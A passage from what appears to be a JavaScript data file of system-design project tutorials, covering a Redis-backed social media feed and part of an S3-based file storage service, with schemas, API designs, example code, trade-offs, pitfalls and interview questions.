│   │   │   └── notifications.js # real-time like/comment events
│   │   ├── db/
│   │   │   ├── pool.js
│   │   │   └── migrate.js
│   │   └── index.js
│   ├── .env
│   └── package.json
├── client/
│   ├── src/
│   │   ├── components/
│   │   │   ├── PostCard.jsx
│   │   │   ├── PostComposer.jsx
│   │   │   ├── LikeButton.jsx   # optimistic update logic
│   │   │   └── FeedSentinel.jsx # IntersectionObserver target
│   │   ├── pages/
│   │   │   ├── FeedPage.jsx
│   │   │   └── ProfilePage.jsx
│   │   ├── hooks/
│   │   │   └── useInfiniteScroll.js
│   │   └── App.jsx
│   └── vite.config.js
└── docker-compose.yml`,
    architectureLayers: [
      { name: 'React Client', description: 'SPA with infinite-scroll feed, optimistic like/unlike, and real-time notifications via Socket.io. IntersectionObserver drives pagination without scroll event listeners.' },
      { name: 'Express API Layer', description: 'Handles post CRUD, follow/unfollow, likes, comments, and feed retrieval. All write endpoints require JWT auth. Validates inputs before touching the DB.' },
      { name: 'Feed Service (Redis)', description: 'Maintains per-user feed caches as Redis sorted sets (score = timestamp, member = postId). Fan-out-on-write: every post creation pushes to all followers feeds instantly.' },
      { name: 'Like Counter Cache (Redis)', description: 'Stores like counts as Redis integers (post:likes:{postId}). INCR/DECR on like/unlike. Eliminates COUNT(*) queries on the likes table for every post render.' },
      { name: 'Socket.io Notifications', description: 'Real-time notification layer: emits like-received and comment-received events to the post author. Users subscribe to their personal notification channel on connect.' },
      { name: 'PostgreSQL', description: 'Source of truth for users, posts, likes, comments, and follows. Like counts denormalized onto posts table for fast reads. Indexed on (user_id, created_at) for profile queries and on follower_id for follow graph traversal.' },
      { name: 'S3 / Storage', description: 'Post images stored in S3 (or MinIO locally). Images uploaded directly from the browser via presigned POST URL — the server generates the URL but never handles the image bytes.' },
    ],
    dataModel: {
      description: 'Denormalized for read performance: like_count and comment_count stored on posts table to avoid COUNT() joins on every feed render.',
      schema: `CREATE TABLE users (
  id            SERIAL PRIMARY KEY,
  email         TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  username      TEXT UNIQUE NOT NULL,
  bio           TEXT,
  avatar_url    TEXT,
  follower_count  INTEGER DEFAULT 0,
  following_count INTEGER DEFAULT 0,
  created_at    TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE posts (
  id            SERIAL PRIMARY KEY,
  user_id       INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  content       TEXT,
  image_url     TEXT,
  like_count    INTEGER DEFAULT 0,
  comment_count INTEGER DEFAULT 0,
  created_at    TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_posts_user_created ON posts(user_id, created_at DESC);
CREATE INDEX idx_posts_created      ON posts(created_at DESC);

CREATE TABLE likes (
  user_id    INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  post_id    INTEGER NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
  created_at TIMESTAMPTZ DEFAULT NOW(),
  PRIMARY KEY (user_id, post_id)
);

CREATE TABLE comments (
  id         SERIAL PRIMARY KEY,
  post_id    INTEGER NOT NULL REFERENCES posts(id) ON DELETE CASCADE,
  user_id    INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  content    TEXT NOT NULL,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_comments_post ON comments(post_id, created_at);

CREATE TABLE follows (
  follower_id  INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  following_id INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  created_at   TIMESTAMPTZ DEFAULT NOW(),
  PRIMARY KEY (follower_id, following_id)
);

CREATE INDEX idx_follows_following ON follows(following_id);`,
    },
    apiDesign: {
      description: 'REST API for social actions plus real-time notifications via Socket.io. Feed endpoint returns paginated post IDs from Redis, hydrated with full post data from PostgreSQL.',
      endpoints: [
        { method: 'GET', path: '/api/feed?cursor=<timestamp>&limit=20', response: '{ posts: [...], nextCursor, hasMore }' },
        { method: 'POST', path: '/api/posts', response: '{ id, content, imageUrl, likeCount, commentCount, createdAt }' },
        { method: 'GET', path: '/api/posts/:id', response: 'Full post object with author info and liked status for current user' },
        { method: 'POST', path: '/api/posts/:id/like', response: '{ liked: true, likeCount: N }' },
        { method: 'DELETE', path: '/api/posts/:id/like', response: '{ liked: false, likeCount: N }' },
        { method: 'POST', path: '/api/posts/:id/comments', response: '{ id, content, userId, createdAt }' },
        { method: 'POST', path: '/api/users/:id/follow', response: '{ following: true }' },
        { method: 'GET', path: '/api/users/:id/posts?cursor=', response: 'Paginated posts for a user profile page' },
      ],
    },
    codeExamples: {
      javascript: `// server/src/services/feedService.js — fan-out on write
import { redis } from './redis.js';
import { getPool } from '../db/pool.js';

export async function fanOutPost(postId, authorId, timestamp) {
  // Get all follower IDs
  const { rows } = await getPool().query(
    'SELECT follower_id FROM follows WHERE following_id = $1',
    [authorId]
  );

  const FEED_MAX_SIZE = 1000;
  const pipe = redis.pipeline();

  for (const { follower_id } of rows) {
    const feedKey = 'feed:' + follower_id;
    // Add post to follower's feed sorted set (score = unix timestamp)
    pipe.zadd(feedKey, timestamp, String(postId));
    // Trim feed to max size (keep newest 1000)
    pipe.zremrangebyrank(feedKey, 0, -(FEED_MAX_SIZE + 1));
  }

  await pipe.exec();
}

// server/src/routes/feed.js — feed retrieval
router.get('/', authenticate, async (req, res) => {
  const userId = req.user.id;
  const cursor = req.query.cursor ? Number(req.query.cursor) : '+inf';
  const limit = 20;

  const feedKey = 'feed:' + userId;
  // Get postIds from Redis sorted set, newest first
  const postIds = await redis.zrevrangebyscore(
    feedKey, cursor, '-inf', 'LIMIT', 0, limit + 1
  );

  const hasMore = postIds.length > limit;
  const pageIds = hasMore ? postIds.slice(0, limit) : postIds;

  if (!pageIds.length) return res.json({ posts: [], hasMore: false });

  // Batch-fetch full post data from PostgreSQL
  const { rows } = await getPool().query(
    \`SELECT p.*, u.username, u.avatar_url,
       EXISTS(SELECT 1 FROM likes WHERE user_id = $2 AND post_id = p.id) AS liked
     FROM posts p JOIN users u ON p.user_id = u.id
     WHERE p.id = ANY($1::int[])
     ORDER BY p.created_at DESC\`,
    [pageIds.map(Number), userId]
  );

  const nextCursor = hasMore ? rows[rows.length - 1].created_at.getTime() : null;
  res.json({ posts: rows, nextCursor, hasMore });
});`,
    },
    tradeoffDecisions: [
      { choice: 'Feed generation strategy', picked: 'Fan-out-on-write (push model)', reason: 'Fan-out-on-read requires querying all followed users on every feed load — O(following_count) DB queries. At 500 follows, this is 500 queries per page load. Fan-out-on-write pre-builds the feed in Redis at post time. Feed reads are O(1) sorted set range queries, making the common case (read) fast at the cost of slower writes.' },
      { choice: 'Like count storage', picked: 'Denormalized integer on posts table + Redis cache', reason: 'Running SELECT COUNT(*) FROM likes WHERE post_id = X for every post in a 20-item feed = 20 count queries per page load. Denormalized like_count on the posts row collapses this to the existing SELECT. Redis INCR/DECR keeps the cache consistent on like/unlike without a DB read.' },
      { choice: 'Image upload strategy', picked: 'Client direct-to-S3 via presigned URL', reason: 'Routing image uploads through the Express server adds unnecessary load — the server becomes a bandwidth bottleneck for large images. Presigned URLs let the client upload directly to S3 at full network speed. The server only generates the URL (fast) and records the resulting S3 key in the DB.' },
      { choice: 'Optimistic vs pessimistic like UI', picked: 'Optimistic update with rollback', reason: 'Waiting for the server to confirm a like before updating the UI adds 100-300ms of perceived latency on every heart tap. Optimistic update makes the interaction feel instant. Rollback on failure (which is rare on a like endpoint) restores correct state.' },
    ],
    deepDiveTopics: [
      { topic: 'Redis sorted sets for feeds', detail: 'A sorted set stores members with a float score. ZADD feed:{userId} {timestamp} {postId} adds a post. ZREVRANGEBYSCORE feed:{userId} +inf {cursor} LIMIT 0 20 returns the 20 most recent posts before the cursor — this is cursor-based pagination on a sorted set. The time complexity is O(log N + M) where N is feed size and M is result count, regardless of how far into history you paginate.' },
      { topic: 'Celebrity problem in fan-out', detail: 'A user with 10M followers posting triggers 10M Redis ZADD operations synchronously. This is the "celebrity problem." Solution: hybrid fan-out. For users with fewer than 10K followers, use fan-out-on-write (push). For celebrities, use fan-out-on-read (pull). When loading the feed, pull from the celebrity's post list directly and merge it with the pre-built Redis feed. Twitter's timeline service uses exactly this hybrid approach.' },
      { topic: 'Optimistic UI and rollback mechanics', detail: 'Store the previous state before the optimistic update. On API failure, restore from the saved state. In React: const previousLiked = post.liked; setPost(p => ({...p, liked: !p.liked, likeCount: p.likeCount + (p.liked ? -1 : 1)})); const result = await api.toggleLike(post.id); if (!result.ok) setPost(p => ({...p, liked: previousLiked, likeCount: ...})). The key is saving the previous state before mutating it.' },
      { topic: 'Infinite scroll with IntersectionObserver', detail: 'Create a sentinel div after the last post. const observer = new IntersectionObserver(([entry]) => { if (entry.isIntersecting && !loading) fetchNextPage(); }); observer.observe(sentinelRef.current). When the sentinel enters the viewport, fetch the next page using the last post's timestamp as cursor. Disconnect the observer while loading to prevent duplicate fetches. Re-observe after the new posts render.' },
    ],
    commonPitfalls: [
      { pitfall: 'Forgetting to update denormalized like_count on the posts table', why: 'If you only insert into the likes table without incrementing posts.like_count, the feed renders with stale counts. The UI shows 0 likes even after 100 people liked a post.', solution: 'Use a PostgreSQL transaction: INSERT INTO likes; then UPDATE posts SET like_count = like_count + 1. Or use a trigger: CREATE TRIGGER update_like_count AFTER INSERT ON likes...' },
      { pitfall: 'Race condition on like/unlike', why: 'Two rapid clicks can both fire the like request before the first response returns, causing a double-like or like-then-unlike sequence. The UNIQUE constraint will reject the second insert but the UI shows incorrect state.', solution: 'Debounce the like button client-side (200ms). Disable the button while the request is in flight. The UNIQUE(user_id, post_id) constraint is the safety net but client debouncing prevents confusing UX.' },
      { pitfall: 'N+1 queries when loading the feed', why: 'Fetching 20 post IDs from Redis, then running 20 individual SELECT * FROM posts WHERE id = X queries is 20 round trips. Under load this is catastrophically slow.', solution: 'Batch-fetch all posts in one query: SELECT * FROM posts WHERE id = ANY($1::int[]) where $1 is the full array of IDs. PostgreSQL handles the IN clause efficiently with the primary key index.' },
      { pitfall: 'Feed staleness after unfollow', why: 'When a user unfollows someone, existing posts from that person remain in the Redis feed sorted set. The unfollowed user's posts continue appearing in the feed.', solution: 'On unfollow, remove all of the unfollowed user's post IDs from the follower's Redis feed. Query all postIds WHERE user_id = unfollowedId in the feed range and ZREM them. This is O(feed_size) but unfollow is rare.' },
    ],
    edgeCases: [
      { scenario: 'New user with no follows sees an empty feed', impact: 'Empty feed on first login is a poor first-run experience that causes user drop-off.', mitigation: 'Fall back to an "explore" feed (trending or recent public posts) when the personalized Redis feed is empty. Show a prompt to follow suggested users based on interests selected during onboarding.' },
      { scenario: 'Post deleted after appearing in followers feeds', impact: 'Followers' Redis feeds still contain the deleted post ID. When the feed is loaded and post IDs hydrated from PostgreSQL, the deleted post returns null — crashing the client or showing an error card.', mitigation: 'Filter out null posts after the batch PostgreSQL fetch. The Redis entry will naturally expire when the feed rotates past its max size. For immediate removal, on delete, scan all follower feeds and ZREM the post ID (async job).' },
      { scenario: 'High-follower user (celebrity) posting', impact: 'Fan-out-on-write for a 1M-follower user triggers 1M Redis ZADD operations synchronously, blocking the POST /api/posts response for seconds.', mitigation: 'Perform fan-out asynchronously: enqueue a fan-out job immediately after creating the post and return 201 to the client. A background worker executes the Redis writes in batches. Use the hybrid approach for users above a follower threshold.' },
      { scenario: 'Feed cursor mismatch after timezone change or clock skew', impact: 'Cursor-based pagination using Unix timestamps breaks if the client and server clocks differ, causing posts to be skipped or repeated.', mitigation: 'Return the cursor as an opaque base64-encoded value that includes the post ID in addition to the timestamp. On the server, decode and use the post ID for tiebreaking: ORDER BY created_at DESC, id DESC WHERE (created_at, id) < (cursor_time, cursor_id).' },
    ],
    interviewFollowups: [
      { question: 'How would you scale the feed to 10M users?', answer: 'Fan-out-on-write stops scaling when users have millions of followers. Move to a hybrid model: fan-out for normal users (<10K followers), fan-out-on-read for celebrities. Scale Redis to a cluster (feed data partitioned by user_id). Move fan-out to an async queue (Kafka or BullMQ). At 10M users with 100 posts/day average, the write rate is ~1000 fan-out operations/second — manageable with a modest Kafka cluster.' },
      { question: 'How would you implement content moderation?', answer: 'On post creation, enqueue a moderation job. The worker sends image and text to a moderation API (AWS Rekognition for images, a custom ML classifier or OpenAI moderation endpoint for text). Flag posts that exceed confidence thresholds. Auto-hide flagged content pending human review. Store moderation results in a post_moderation_results table. Repeat scoring for posts that accumulate reports.' },
      { question: 'How would you add hashtag and mention support?', answer: 'Parse post content for #hashtags and @mentions using regex. Upsert into hashtags table and create post_hashtags join rows. Upsert into mentions table, triggering a notification to the mentioned user. For hashtag feeds, maintain per-hashtag Redis sorted sets using the same fan-out pattern as user feeds.' },
      { question: 'How would you implement story/24h post expiry?', answer: 'Add an expires_at column to posts (NOW() + INTERVAL 24 hours for stories). A cron job runs every 5 minutes: DELETE FROM posts WHERE expires_at < NOW() AND type = 'story'. On delete, fire the feed cleanup async job. Alternatively use PostgreSQL TTL triggers or a background worker watching a Redis ZSET of (expires_at, postId) pairs.' },
    ],
    extensionIdeas: [
      { idea: 'Hashtag Feeds', difficulty: 'beginner', description: 'Parse #hashtags from post content on save. Store in a hashtags table and maintain per-hashtag Redis sorted sets. Build a GET /api/hashtags/:tag/posts endpoint. Add a trending hashtags panel showing the top 10 by post count in the last 24h.' },
      { idea: 'Direct Messages', difficulty: 'intermediate', description: 'Add a direct_messages table (sender_id, recipient_id, content, read_at). Build a DM inbox UI showing conversation threads. Use Socket.io for real-time delivery. This reuses the follow graph to control who can DM whom (only mutual follows).' },
      { idea: 'Post Bookmarks / Saves', difficulty: 'beginner', description: 'Add a bookmarks table (user_id, post_id, created_at). Add a save/unsave button on PostCard. Build a Saved Posts page showing bookmarked posts. Useful for content the user wants to revisit without liking publicly.' },
      { idea: 'Recommendation Engine', difficulty: 'advanced', description: 'Build a "users you may know" feature using collaborative filtering: users who follow the same people as you are likely interesting. Compute this with a SQL query: SELECT following_id FROM follows WHERE follower_id IN (your follows) AND following_id NOT IN (your follows). Schedule daily pre-computation and cache results in Redis.' },
    ],
  },
  {
    id: 'file-storage-service',
    title: 'File Storage Service',
    icon: 'upload',
    color: '#14b8a6',
    difficulty: 'advanced',
    estimatedTime: '7-9 hours',
    techStack: ['Node.js', 'Express', 'S3/MinIO', 'PostgreSQL', 'React'],
    questions: 4,
    description: 'Build a Dropbox-style file storage service with upload, download, sharing, preview, folder management, and storage quotas.',
    introduction: 'Create a file management application. Users upload files to S3-compatible storage, organize them in folders, share via public links with expiration, preview images/PDFs inline, and monitor storage usage against their quota.',
    interviewRelevance: 'Tests cloud storage integration (S3 presigned URLs), file streaming, chunked uploads for large files, access control (public/private/shared), and quota enforcement. Relevant for any cloud-focused role.',
    learningObjectives: [
      'Implement S3 file operations: presigned upload URLs, direct download, and deletion',
      'Build chunked upload for large files with progress tracking and resume capability',
      'Create a sharing system with expiring public links and password protection',
      'Implement folder hierarchy with breadcrumb navigation and recursive operations',
    ],
    keyQuestions: [
      { question: 'How should I handle file uploads?', answer: 'Two approaches: 1) Client uploads directly to S3 via presigned URL (best for large files — server never touches the file), 2) Client uploads to server, server streams to S3 (simpler, works for small files). Use presigned URLs for files >5MB. Generate the presigned URL via a POST /api/files/upload-url endpoint.' },
      { question: 'How do I implement file sharing?', answer: 'Generate a share token (random UUID), store it with: file_id, created_by, expires_at, password_hash (optional), download_count, max_downloads. Share URL: /share/:token. On access: verify token exists, check expiry, check download count, verify password if set, then redirect to S3 presigned download URL (short TTL, e.g., 5 minutes).' },
      { question: 'How do I build the folder hierarchy?', answer: 'Adjacency list model: files table has a parent_folder_id column (NULL for root). Query children: WHERE parent_folder_id = :folderId. Build breadcrumb by recursively fetching parent folders. For operations like "folder size" or "delete folder," use recursive CTEs in PostgreSQL: WITH RECURSIVE folder_tree AS (...).' },
      { question: 'How do I enforce storage quotas?', answer: 'Track total storage per user: SUM(file_size) WHERE user_id = :userId. Check quota before upload: if current_usage + new_file_size > quota, reject with 413 Payload Too Large. Cache the usage in Redis for fast checks. Update cache atomically on upload (INCRBY) and delete (DECRBY).' },
    ],
    implementationSteps: [
      {
        phase: 1,
        title: 'Backend Setup, Auth & PostgreSQL Schema',
        description: 'Set up Express, PostgreSQL schema for files/folders, and JWT auth.',
        tasks: [
          'Initialize Node.js/Express project with pg, @aws-sdk/client-s3, ioredis, bcrypt, jsonwebtoken',
          'Create PostgreSQL tables: users, files, folders, share_tokens with proper FK relationships',
          'Build JWT auth: POST /api/auth/register and /login',
          'Configure AWS S3 SDK (or MinIO locally via docker-compose): bucket, region, credentials',
          'Build GET /api/files?folderId= listing files and folders at a given path level',
        ],
      },
      {
        phase: 2,
        title: 'File Upload & Download via S3 Presigned URLs',
        description: 'Implement presigned URL upload flow and secure download.',
        tasks: [
          'POST /api/files/upload-url: validate quota, generate S3 presigned PUT URL (15min TTL)',
          'POST /api/files/confirm: client calls after S3 upload to record file metadata in PostgreSQL',
          'GET /api/files/:id/download: generate presigned GET URL (5min TTL), redirect client',
          'DELETE /api/files/:id: delete from S3 (DeleteObjectCommand), remove DB record, update quota',
          'Add quota check middleware: fetch user storage_used from Redis or DB, compare to limit',
        ],
      },
      {
        phase: 3,
        title: 'Folder Hierarchy & Share Links',
        description: 'Build folder management with adjacency list model and expiring share tokens.',
        tasks: [
          'POST /api/folders: create folder with name and parent_folder_id (NULL for root)',
          'Build breadcrumb: recursive CTE to fetch ancestor chain from any folder to root',
          'DELETE /api/folders/:id: recursive CTE to find all descendant files, delete from S3 in batch, then delete DB records',
          'POST /api/files/:id/share: generate UUID share token with expires_at and optional password',
          'GET /share/:token: validate token, check expiry/password, redirect to presigned download URL',
        ],
      },
      {
        phase: 4,
        title: 'React File Manager UI',
        description: 'Build the file manager: browser, drag-and-drop upload, preview, and sharing.',
        tasks: [
          'Build FileBrowser: grid/list toggle showing folders and files with icons by mime type',
          'Add drag-and-drop upload with progress bar (XHR to presigned URL, onprogress events)',
          'Build breadcrumb navigation component that updates URL query params on folder change',
          'Add context menu: rename, delete, share, move, download actions per file/folder',
          'Build share modal: show share link with copy button, expiry date picker, optional password',
        ],
      },
    ],
    fileStructure: `file-storage-service/
├── server/
│   ├── src/
│   │   ├── routes/
│   │   │   ├── auth.js          # POST /api/auth/register, /login
│   │   │   ├── files.js         # upload-url, confirm, download, delete, move
│   │   │   ├── folders.js       # CRUD for folders, recursive delete
│   │   │   ├── share.js         # POST /api/files/:id/share, GET /share/:token
│   │   │   └── storage.js       # GET /api/storage/usage
│   │   ├── services/
│   │   │   ├── s3.js            # S3 SDK wrappers: presignedPut, presignedGet, deleteObject
│   │   │   ├── quota.js         # check/update storage usage (Redis + DB)
│   │   │   └── folderTree.js    # recursive CTE helpers for breadcrumb + recursive delete
│   │   ├── middleware/
│   │   │   ├── auth.js          # JWT verify
│   │   │   └── quota.js         # quota check before upload
│   │   ├── db/
│   │   │   ├── pool.js
│   │   │   └── migrate.js
│   │   └── index.js
│   ├── .env
│   └── package.json
├── client/
│   ├── src/
│   │   ├── components/
│   │   │   ├── FileBrowser.jsx
│   │   │   ├── FileCard.jsx
│   │   │   ├── UploadZone.jsx   # drag-and-drop with progress
│   │   │   ├── Breadcrumb.jsx
│   │   │   └── ShareModal.jsx
│   │   ├── pages/
│   │   │   ├── DashboardPage.jsx
│   │   │   └── SharedFilePage.jsx  # public share link view
│   │   └── App.jsx
│   └── vite.config.js
├── docker-compose.yml           # postgres + redis + minio
└── .env.example`,
    architectureLayers: [
      { name: 'React Client', description: 'File manager SPA with drag-and-drop upload zone, breadcrumb navigation, file/folder grid, and context menus. Uploads go directly to S3/MinIO — the server never handles file bytes.' },
      { name: 'Express API Layer', description: 'Issues presigned S3 URLs, records file metadata, manages folder hierarchy, generates share tokens, and enforces quotas. Thin orchestration layer — no file streaming.' },
      { name: 'S3 / MinIO Storage', description: 'Object storage for all file bytes. Presigned PUT URLs for client-direct uploads; presigned GET URLs for secure, time-limited downloads. MinIO used locally (S3-compatible API).' },
      { name: 'PostgreSQL', description: 'Stores file metadata (name, size, mime type, S3 key), folder adjacency list, share tokens, and per-user storage totals. Recursive CTEs for folder tree operations.' },
      { name: 'Redis Quota Cache', description: 'Caches current storage_used per user (INCRBY/DECRBY on upload/delete). Eliminates SUM(file_size) queries on every upload. Falls back to DB SUM on cache miss.' },
      { name: 'Share Token Service', description: 'Generates UUID-based share tokens with optional expiry and bcrypt-hashed passwords. Public /share/:token endpoint validates token then issues a short-lived presigned download URL.' },
    ],
    dataModel: {
      description: 'Files and folders in an adjacency list hierarchy. Share tokens stored separately for clean expiry management. Storage usage tracked both on the user row and cached in Redis.',
      schema: `CREATE TABLE users (
  id            SERIAL PRIMARY KEY,
  email         TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL,
  storage_used  BIGINT DEFAULT 0,       -- bytes, denormalized
  storage_limit BIGINT DEFAULT 5368709120,  -- 5 GB default
  created_at    TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE folders (
  id               SERIAL PRIMARY KEY,
  name             TEXT NOT NULL,
  user_id          INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  parent_folder_id INTEGER REFERENCES folders(id) ON DELETE CASCADE,
  created_at       TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_folders_user_parent ON folders(user_id, parent_folder_id);

CREATE TABLE files (
  id               SERIAL PRIMARY KEY,
  name             TEXT NOT NULL,
  user_id          INTEGER NOT NULL REFERENCES users(id) ON DELETE CASCADE,
  folder_id        INTEGER REFERENCES folders(id) ON DELETE CASCADE,
  s3_key           TEXT NOT NULL UNIQUE,
  mime_type        TEXT,
  size_bytes       BIGINT NOT NULL,
  created_at       TIMESTAMPTZ DEFAULT NOW(),
  updated_at       TIMESTAMPTZ DEFAULT NOW()
);

CREATE INDEX idx_files_user_folder ON files(user_id, folder_id);

CREATE TABLE share_tokens (
  id             SERIAL PRIMARY KEY,
  token          UUID UNIQUE NOT NULL DEFAULT gen_random_uuid(),
  file_id        INTEGER NOT NULL REFERENCES files(id) ON DELETE CASCADE,
  created_by     INTEGER NOT NULL REFERENCES users(id),
  password_hash  TEXT,
  expires_at     TIMESTAMPTZ,
  download_count INTEGER DEFAULT 0,
  max_downloads  INTEGER,
  created_at     TIMESTAMPTZ DEFAULT NOW()
);`,
    },
    apiDesign: {
      description: 'Two-phase upload flow: get presigned URL, upload to S3, then confirm. Separate public endpoint for share link access.',
      endpoints: [
        { method: 'POST', path: '/api/files/upload-url', response: '{ uploadUrl, s3Key, expiresIn: 900 } — presigned S3 PUT URL' },
        { method: 'POST', path: '/api/files/confirm', response: '{ id, name, sizeBytes, mimeType, createdAt } — records file after S3 upload' },
        { method: 'GET', path: '/api/files?folderId=<id>', response: '{ folders: [...], files: [...] } — contents of a folder (null = root)' },
        { method: 'GET', path: '/api/files/:id/download', response: 'HTTP 302 to presigned S3 GET URL (5min TTL)' },
        { method: 'DELETE', path: '/api/files/:id', response: '204 No Content — deletes from S3 and DB, updates quota' },
        { method: 'POST', path: '/api/files/:id/share', response: '{ shareUrl, token, expiresAt }' },
        { method: 'GET', path: '/share/:token', response: 'HTTP 302 to presigned download URL after token validation' },
        { method: 'GET', path: '/api/folders/:id/breadcrumb', response: 'Array of { id, name } from root to the current folder' },
      ],
    },
    codeExamples: {
      javascript: `// server/src/routes/files.js — two-phase upload + download
import { S3Client, PutObjectCommand, GetObjectCommand, DeleteObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';
import { nanoid } from 'nanoid';
import { getPool } from '../db/pool.js';
import { checkAndReserveQuota, releaseQuota } from '../services/quota.js';

const s3 = new S3Client({ region: process.env.AWS_REGION });
const BUCKET = process.env.S3_BUCKET;

// Phase 1: generate presigned upload URL
router.post('/upload-url', authenticate, async (req, res) => {
  const { filename, mimeType, sizeBytes } = req.body;

  // Check quota before issuing the URL
  const allowed = await checkAndReserveQuota(req.user.id, sizeBytes);
  if (!allowed) {
    return res.status(413).json({ error: 'Storage quota exceeded' });
  }

  const s3Key = 'uploads/' + req.user.id + '/' + nanoid() + '/' + filename;

  const command = new PutObjectCommand({
    Bucket: BUCKET, Key: s3Key,
    ContentType: mimeType, ContentLength: sizeBytes,
  });
  const uploadUrl = await getSignedUrl(s3, command, { expiresIn: 900 });

  res.json({ uploadUrl, s3Key, expiresIn: 900 });
});

// Phase 2: confirm after client uploads to S3
router.post('/confirm', authenticate, async (req, res) => {
  const { s3Key, filename, sizeBytes, mimeType, folderId } = req.body;

  const { rows } = await getPool().query(
    \`INSERT INTO files (name, user_id, folder_id, s3_key, mime_type, size_bytes)
     VALUES ($1, $2, $3, $4, $5, $6) RETURNING *\`,
    [filename, req.user.id, folderId || null, s3Key, mimeType, sizeBytes]
  );

  // Update user storage_used
  await getPool().query(
    'UPDATE users SET storage_used = storage_used + $1 WHERE id = $2',
    [sizeBytes, req.user.id]
  );

  res.status(201).json(rows[0]);
});

// Download: generate short-lived presigned GET URL
router.get('/:id/download', authenticate, async (req, res) => {
  const { rows } = await getPool().query(
    'SELECT s3_key, name FROM files WHERE id = $1 AND user_id = $2',
    [req.params.id, req.user.id]
  );
  if (!rows.length) return res.status(404).json({ error: 'File not found' });

  const command = new GetObjectCommand({
    Bucket: BUCKET, Key: rows[0].s3_key,
    ResponseContentDisposition: 'attachment; filename="' + rows[0].name + '"',
  });
  const downloadUrl = await getSignedUrl(s3, command, { expiresIn: 300 });
  res.redirect(302, downloadUrl);
});`,
    },
    tradeoffDecisions: [
      { choice: 'Upload routing: client-direct vs server-proxied', picked: 'Client direct-to-S3 via presigned URL', reason: 'Routing uploads through Express means the server handles every byte of every file upload — a 1GB upload ties up a server worker for minutes. Presigned URLs let the client upload at full network speed directly to S3. The server only spends <10ms generating the URL.' },
      { choice: 'Folder hierarchy model', picked: 'Adjacency list (parent_folder_id)', reason: 'Nested sets and closure tables are more complex to maintain. Adjacency list is simple: one FK column. PostgreSQL recursive CTEs (WITH RECURSIVE) handle the tree traversal for breadcrumbs and recursive deletes efficiently without changing the schema.' },
      { choice: 'Share link security', picked: 'UUID token + optional bcrypt password', reason: 'UUID (128-bit) tokens are unguessable — no auth required for the holder. Optional bcrypt password adds a second factor for sensitive files. Short-lived presigned download URLs (5min) mean the share token never exposes S3 credentials directly.' },
      { choice: 'Quota enforcement timing', picked: 'Check before generating upload URL, update after confirm', reason: 'Checking quota after the upload means the user has already transferred data that will be rejected. Checking before the presigned URL is generated prevents wasted bandwidth. The quota reservation is optimistic — if the client never calls /confirm, a cleanup job reconciles reserved-but-unused space.' },
    ],
    deepDiveTopics: [
      { topic: 'S3 presigned URL security model', detail: 'A presigned PUT URL encodes the bucket, key, content-type, and expiry in a signed query string using HMAC-SHA256 over your AWS credentials. Anyone with the URL can upload to that exact key before expiry — no auth required. The signature prevents uploading to a different key or after the TTL. Set a short TTL (15min) so leaked URLs cannot be exploited. Add a ContentLength condition to prevent users uploading more than the allowed file size.' },
      { topic: 'Recursive CTEs for folder trees', detail: 'PostgreSQL WITH RECURSIVE syntax: WITH RECURSIVE tree AS (SELECT id, name, parent_folder_id FROM folders WHERE id = $rootId UNION ALL SELECT f.id, f.name, f.parent_folder_id FROM folders f JOIN tree t ON f.parent_folder_id = t.id) SELECT * FROM tree. This traverses the entire subtree in one query. For breadcrumbs, traverse upward instead: join on parent_folder_id = t.id.' },
      { topic: 'Large file chunked upload with resumability', detail: 'For files over 100MB, use S3 multipart upload. The client initiates (CreateMultipartUpload), uploads 5MB+ chunks in parallel (UploadPart), and completes (CompleteMultipartUpload). If the upload is interrupted, the client can resume by listing existing parts (ListParts) and only re-uploading missing chunks. Store the S3 UploadId in the DB during upload to support resume.' },
      { topic: 'Storage quota consistency', detail: 'If you update storage_used in the DB after every upload/delete, concurrent uploads can create race conditions: two simultaneous uploads both read storage_used = 4.9GB (limit 5GB), both pass the check, both add 200MB, resulting in 5.3GB used. Solution: use PostgreSQL UPDATE users SET storage_used = storage_used + $1 WHERE id = $2 AND storage_used + $1 <= storage_limit RETURNING id. If no row is returned, the quota was exceeded.' },
    ],
    commonPitfalls: [
      { pitfall: 'Storing files in PostgreSQL as bytea', why: 'Storing file contents in the DB bloats the database, causes massive memory pressure on queries, and makes backups enormous. PostgreSQL is optimized for structured data, not binary blobs.', solution: 'Always store files in S3 or equivalent object storage. Store only the S3 key, metadata, and size in PostgreSQL. The DB stays fast; S3 handles petabytes of binary data cheaply.' },
      { pitfall: 'Generating presigned download URLs that never expire', why: 'A presigned URL with a long TTL (1 week, 1 year) that gets shared or leaked remains valid indefinitely. Anyone with the URL can download the file regardless of whether the share was revoked.', solution: 'Use short-lived presigned download URLs (5min TTL). On each GET /files/:id/download request, generate a fresh presigned URL. The download URL expires quickly; access is controlled by the API endpoint auth, not the URL itself.' },
      { pitfall: 'Not deleting S3 objects on file deletion', why: 'Deleting the DB record without deleting the S3 object leaves orphaned files accumulating in S3. Over time, S3 costs grow and confidential files remain accessible to anyone with the key.', solution: 'Always issue DeleteObjectCommand before or after deleting the DB record. Wrap both in a try/catch — if S3 delete fails, retry async rather than leaving a dangling DB record.' },
      { pitfall: 'Race condition on quota enforcement', why: 'Two concurrent uploads both read storage_used < limit and both succeed, pushing the user over quota.', solution: 'Use a conditional PostgreSQL UPDATE with a RETURNING clause: UPDATE users SET storage_used = storage_used + $1 WHERE id = $2 AND storage_used + $1 <= storage_limit RETURNING id. If the UPDATE returns 0 rows, reject the upload.' },
    ],
    edgeCases: [
